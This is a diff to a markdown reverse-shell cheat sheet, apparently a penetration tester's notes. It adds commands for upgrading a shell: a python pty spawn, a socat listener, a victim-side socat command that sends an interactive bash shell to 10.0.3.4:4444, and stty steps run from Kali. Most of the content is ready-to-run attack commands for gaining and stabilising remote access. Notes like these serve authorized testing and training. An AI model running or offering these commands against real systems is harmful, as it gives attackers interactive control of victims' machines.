@@ -1,5 +1,5 @@
 ---
-tags: [ exploit, tool ]
+tags: [ exploit, tool, shell ]
 ---
 # REVERSE SHELL
 # Userfull shell generator
@@ -41,11 +41,28 @@ exec "/bin/bash"
 # Lua
 os.execute('/bin/bash')
 
-# Adjust Interactive shell
-stty size # Find your terminal size -> 50 235
+# Pimp your SHELL
+#Using Python for a psuedo terminal
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+#Using socat
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
+#Using stty options
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
-stty raw -echo  // Disable shell echo
-fg
-export SHELL=bash
-export TERM=xterm OR export TERM=xterm-256color
-stty rows 50 columns 235
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
